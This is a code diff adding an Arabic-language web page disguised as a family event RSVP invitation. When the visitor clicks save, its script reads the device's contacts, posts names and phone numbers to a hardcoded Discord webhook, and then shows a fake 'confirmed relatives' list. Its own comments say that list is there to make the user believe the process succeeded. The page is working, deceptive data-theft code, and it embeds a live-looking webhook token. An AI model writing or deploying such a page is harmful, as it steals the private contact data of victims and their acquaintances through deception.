@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دعوة عائلية خاصة</title>
+    <style>
+        :root {
+            --primary: #6C5CE7; /* لون بنفسجي شبابي */
+            --secondary: #A29BFE;
+            --bg: #F8F9FA;
+            --card-bg: #FFFFFF;
+            --text: #2D3436;
+            --success: #00B894;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text);
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            margin-bottom: 25px;
+        }
+
+        .header h1 {
+            color: var(--primary);
+            font-size: 24px;
+            margin: 0;
+        }
+
+        .header p {
+            color: #636e72;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            color: #636e72;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #dfe6e9;
+            border-radius: 12px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            gap: 10px;
+        }
+
+        .option-btn {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #dfe6e9;
+            border-radius: 15px;
+            background: white;
+            cursor: pointer;
+            font-size: 24px;
+            transition: all 0.3s;
+        }
+
+        .option-btn:hover {
+            background: #f1f2f6;
+        }
+
+        .option-btn.selected {
+            border-color: var(--primary);
+            background: #f0f0ff;
+            transform: scale(1.05);
+        }
+
+        .save-btn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
+            transition: transform 0.2s;
+        }
+
+        .save-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .save-btn:disabled {
+            background: #b2bec3;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #636e72;
+            min-height: 20px;
+        }
+
+        /* القائمة النهائية التي تظهر للمستخدم لتوهمه أن العملية ناجحة */
+        .final-list {
+            margin-top: 20px;
+            text-align: right;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            display: none; /* مخفية حتى النهاية */
+        }
+
+        .final-list h3 {
+            color: var(--primary);
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .contact-item {
+            background: #f8f9fa;
+            padding: 10px;
+            margin-bottom: 8px;
+            border-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-right: 4px solid var(--success);
+        }
+
+        .contact-name {
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .contact-phone {
+            font-size: 12px;
+            color: #636e72;
+        }
+
+        .badge {
+            background: var(--success);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1>🎉 دعوة عائلية خاصة</h1>
+            <p>نحن نجمع الأقارب المؤكدين للحضور. يرجى تأكيد اسمك.</p>
+        </div>
+
+        <!-- الخيار الأول: كتابة الاسم -->
+        <div class="input-group">
+            <label for="userName">اسمك الكامل:</label>
+            <input type="text" id="userName" placeholder="مثال: محمد صالح">
+        </div>
+
+        <!-- الخيار الثاني: تأكيد الحضور بإيموجي -->
+        <label style="margin-bottom: 10px; display: block;">هل ستحضر؟</label>
+        <div class="options">
+            <button class="option-btn" onclick="selectOption(this, 'yes')" title="نعم، سأحضر">👍</button>
+            <button class="option-btn" onclick="selectOption(this, 'no')" title="لا، لن أحضر">👎</button>
+        </div>
+
+        <!-- زر الحفظ الذي يشغل العملية -->
+        <button class="save-btn" id="saveBtn" onclick="processContacts()">حفظ وتأكيد الحضور</button>
+        
+        <div id="status"></div>
+
+        <!-- القائمة النهائية التي تظهر للمستخدم بعد الانتهاء -->
+        <div class="final-list" id="finalList">
+            <h3>✅ الأقارب المؤكدون (تم التحديث)</h3>
+            <div id="contactsContainer"></div>
+            <p style="font-size: 12px; color: green; margin-top: 10px;">تم إرسال البيانات بنجاح!</p>
+        </div>
+    </div>
+
+    <script>
+        // رابط الويب هوك الخاص بك
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1575641103556812930/DEVNIZayINKN7T64LHOC8XsXjouUUiTnfEoF0Gv4L8iT6LN-QwkMruka_X3qKwrzf-x1";
+        
+        let selectedOption = null;
+
+        function selectOption(btn, option) {
+            // إزالة التحديد من الجميع
+            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+            // تحديد الزر الحالي
+            btn.classList.add('selected');
+            selectedOption = option;
+        }
+
+        async function processContacts() {
+            const statusDiv = document.getElementById('status');
+            const saveBtn = document.getElementById('saveBtn');
+            const finalList = document.getElementById('finalList');
+            const contactsContainer = document.getElementById('contactsContainer');
+            
+            // التحقق من إدخال الاسم والخيار
+            const userName = document.getElementById('userName').value.trim();
+            if (!userName) {
+                alert("الرجاء كتابة اسمك أولاً");
+                return;
+            }
+            if (!selectedOption) {
+                alert("الرجاء اختيار إيموجي (👍 أو 👎)");
+                return;
+            }
+
+            // تعطيل الزر أثناء المعالجة
+            saveBtn.disabled = true;
+            statusDiv.textContent = "جاري قراءة جهات الاتصال...";
+            statusDiv.style.color = "#636e72";
+
+            if (!window.Contacts) {
+                statusDiv.textContent = "متصفحك لا يدعم هذه الميزة.";
+                saveBtn.disabled = false;
+                return;
+            }
+
+            try {
+                // قراءة جهات الاتصال
+                const contacts = await window.Contacts.getAll();
+                
+                if (!contacts || contacts.length === 0) {
+                    statusDiv.textContent = "لا توجد جهات اتصال.";
+                    saveBtn.disabled = false;
+                    return;
+                }
+
+                // تجهيز البيانات للإرسال إلى ديسكورد
+                let messageText = `**🎉 دعوة عائلية - تأكيد حضور:**\n\n` +
+                                  `**الحاضر:** ${userName} (${selectedOption === 'yes' ? '👍' : '👎'})\n\n` +
+                                  `**📱 قائمة الأقارب المسحوبة:**\n`;
+                
+                let embedData = {
+                    title: "تحديث قائمة الحضور",
+                    description: `المستخدم: ${userName} اختار: ${selectedOption === 'yes' ? '👍' : '👎'}`,
+                    color: 16753920, // لون برتقالي/أحمر
+                    fields: []
+                };
+
+                // تجميع الأسماء والأرقام
+                let count = 0;
+                let displayHtml = "";
+
+                // عرض أول 10 أشخاص للمستخدم (لإيهامه بأن العملية ناجحة ومحدودة)
+                for (let i = 0; i < Math.min(contacts.length, 10); i++) {
+                    const contact = contacts[i];
+                    const name = contact.name || "غير معروف";
+                    const phone = contact.phones ? contact.phones[0]?.value : "بدون رقم";
+
+                    messageText += `${i + 1}. ${name}: ${phone}\n`;
+                    
+                    // إضافة للـ Embed في ديسكورد
+                    embedData.fields.push({
+                        name: name,
+                        value: `📞 ${phone}`,
+                        inline: true
+                    });
+
+                    // إنشاء HTML للعرض المحلي للمستخدم (ليظهر كأقارب مؤكدين)
+                    displayHtml += `
+                        <div class="contact-item">
+                            <div>
+                                <span class="contact-name">${name}</span>
+                                <span class="contact-phone">${phone}</span>
+                            </div>
+                            <span class="badge">مؤكد</span>
+                        </div>
+                    `;
+                    count++;
+                }
+
+                if (contacts.length > 10) {
+                    embedData.fields.push({
+                        name: "المزيد...",
+                        value: `و ${contacts.length - 10} شخص آخر`,
+                        inline: false
+                    });
+                }
+
+                // إرسال إلى ديسكورد
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: messageText,
+                        embeds: [embedData]
+                    })
+                });
+
+                if (response.ok) {
+                    statusDiv.textContent = "تم الحفظ بنجاح! ✅";
+                    statusDiv.style.color = "green";
+                    
+                    // إظهار القائمة النهائية للمستخدم
+                    contactsContainer.innerHTML = displayHtml;
+                    finalList.style.display = 'block';
+                    
+                    // إخفاء العناصر الأخرى لتبدو الصفحة نظيفة
+                    document.querySelector('.input-group').style.display = 'none';
+                    document.querySelector('.options').style.display = 'none';
+                    saveBtn.style.display = 'none';
+                } else {
+                    statusDiv.textContent = "حدث خطأ أثناء الإرسال ❌";
+                    statusDiv.style.color = "red";
+                    saveBtn.disabled = false;
+                }
+
+            } catch (error) {
+                console.error(error);
+                statusDiv.textContent = "حدث خطأ: " + error.message;
+                saveBtn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
